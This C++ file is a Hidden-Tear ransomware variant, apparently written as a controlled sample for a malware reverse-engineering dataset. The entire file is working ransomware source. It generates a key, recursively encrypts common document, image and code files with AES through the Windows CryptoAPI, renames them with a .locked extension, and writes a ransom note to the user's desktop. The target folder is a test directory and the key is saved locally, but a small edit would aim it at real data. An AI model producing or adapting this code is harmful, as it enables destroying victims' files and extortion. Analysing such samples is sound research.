// A01_2 Hidden-Tear variant with Local Encryption and Coercion via Ransomnote
#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>
#include <random>
#include <algorithm>
#include <sstream>
#include <cstdlib>
#include <iterator>

#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

namespace fs = std::filesystem;

namespace a01_2_ransomware_encrypt_and_coerce
{
    class A01_2_Sample
    {
        private:
        std::string user_name;
        std::string user_dir = "C:\\Users\\";

        public:
        A01_2_Sample()
        {
            // In C++, we simulate the environment variable retrieval
            char* env_user = std::getenv("USERNAME");
            if (env_user != nullptr)
            {
                user_name = std::string(env_user);
            }
            else
            {
                user_name = "DefaultUser";
            }

        }

        void run()
        {
            // starts encryption at form load
            start_action();
        }

        // AES encryption algorithm
        std::vector<unsigned char> aes_encrypt(
            const std::vector<unsigned char> &plaintext,
            const std::string &key)
        {
            std::vector<unsigned char> encrypted;

            HCRYPTPROV hProv = 0;
            HCRYPTHASH hHash = 0;
            HCRYPTKEY hKey = 0;

            if (!CryptAcquireContext(
                    &hProv,
                    nullptr,
                    nullptr,
                    PROV_RSA_AES,
                    CRYPT_VERIFYCONTEXT))
            {
                return encrypted;
            }

            if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
            {
                CryptReleaseContext(hProv, 0);
                return encrypted;
            }

            if (!CryptHashData(
                    hHash,
                    reinterpret_cast<const BYTE *>(key.data()),
                    static_cast<DWORD>(key.size()),
                    0))
            {
                CryptDestroyHash(hHash);
                CryptReleaseContext(hProv, 0);
                return encrypted;
            }

            if (!CryptDeriveKey(
                    hProv,
                    CALG_AES_256,
                    hHash,
                    0,
                    &hKey))
            {
                CryptDestroyHash(hHash);
                CryptReleaseContext(hProv, 0);
                return encrypted;
            }

            encrypted = plaintext;

            DWORD dataLen = static_cast<DWORD>(encrypted.size());
            DWORD bufferLen = dataLen + 16;
            encrypted.resize(bufferLen);

            if (!CryptEncrypt(
                    hKey,
                    0,
                    TRUE,
                    0,
                    encrypted.data(),
                    &dataLen,
                    bufferLen))
            {
                encrypted.clear();
            }
            else
            {
                encrypted.resize(dataLen);
            }

            CryptDestroyKey(hKey);
            CryptDestroyHash(hHash);
            CryptReleaseContext(hProv, 0);

            return encrypted;
        }

        // creates random encryption key
        std::string generate_key(int length)
        {
            const std::string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            std::string res = "";

            std::random_device rd;
            std::mt19937 generator(rd());
            std::uniform_int_distribution<int> distribution(0, valid.size() - 1);

            while (0 < length--)
            {
                res += valid[distribution(generator)];
            }
            return res;
        }

        // Encrypts single file
        void encrypt_file(std::string file, std::string key)
        {
            // Check if file ends with .locked
            std::string extension = fs::path(file).extension().string();
            std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
            if (extension == ".locked")
            {
                return;
            }

            std::ifstream input(file, std::ios::binary);
            if (!input)
            {
                return;
            }

            std::vector < unsigned char> bytes_to_be_encrypted((std::istreambuf_iterator<char>(input)), (std::istreambuf_iterator<char>()));
            input.close();

            // Derive AES key and encrypt file contents using CryptoAPI.
            std::vector<unsigned char> bytes_encrypted =
                aes_encrypt(bytes_to_be_encrypted, key);

            if (bytes_encrypted.empty())
            {
                return;
            }

            // Write all bytes
            std::ofstream output(file, std::ios::binary | std::ios::trunc);
            if (!output)
            {
                return;
            }
            output.write(
                reinterpret_cast<const char *>(bytes_encrypted.data()),
                bytes_encrypted.size());
            output.close();

            // Move file to .locked
            fs::rename(file, file + ".locked");
        }

        // Encrypts a directory and all its subdirectories
        void encrypt_directory(std::string location, std::string key)
        {
            // extensions to be encrypt
            std::vector < std::string> valid_extensions = {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"}
            ;

            try
            {
                for (const auto&entry : fs::directory_iterator(location))
                    {
                    if (fs::is_regular_file(entry.path()))
                    {
                        std::string ext = entry.path().extension().string();
                        std::transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

                        bool isValid = false;
                        for (const auto&valid_ext : valid_extensions)
                            {
                            if (ext == valid_ext)
                            {
                                isValid = true;
                                break;
                            }
                        }

                        if (isValid)
                        {
                            try
                            {
                                encrypt_file(entry.path().string(), key);
                            }
                            catch (...)
                                {
                                // Ignore individual file errors
                            }
                            }
                        }
                        else if (fs::is_directory(entry.path()))
                        {
                            try
                            {
                                encrypt_directory(entry.path().string(), key);
                            }
                            catch (...)
                            {
                                // Ignore inaccessible directories
                            }
                            }
                        }
                    }
                catch (...)
                {
                // Ignore directory access errors
            }
        }

        // Starts the encryption process
        void start_action()
        {
            std::string key = generate_key(15);
            std::string key_path = "C:\\Users\\Public\\A01_2_Lab_Encryption_Key.txt";

            std::ofstream key_file(key_path);
            key_file << key;
            key_file.close();

            std::string start_path = "C:\\Users\\Public\\A01_TestData";

            if (fs::exists(start_path) && fs::is_directory(start_path))
            {
                encrypt_directory(start_path, key);
            }
            message_creator();
            key = ""; // Clear key

            // Application.Exit() equivalent
            std::exit(0);
        }

        void message_creator()
        {
            std::string path = "\\Desktop\\READ_IT.txt";
            std::string fullpath = user_dir + user_name + path;

            std::ofstream note_file(fullpath);
            note_file << "A01_2 controlled ransomware/coercion sample." << std::endl;
            note_file << "Files in C:\\Users\\Public\\A01_TestData have been encrypted." << std::endl;
            note_file << "This note is generated for malware reverse-engineering dataset analysis." << std::endl;
            note_file << "No payment is required. Use the lab key file to decrypt test files." << std::endl;
            note_file.close();
        }
    };

    class Program
    {
        public:
        static void main()
        {
            A01_2_Sample sample;
            sample.run();
        }
    };
}

int main()
{
    a01_2_ransomware_encrypt_and_coerce::Program::main();
    return 0;
}
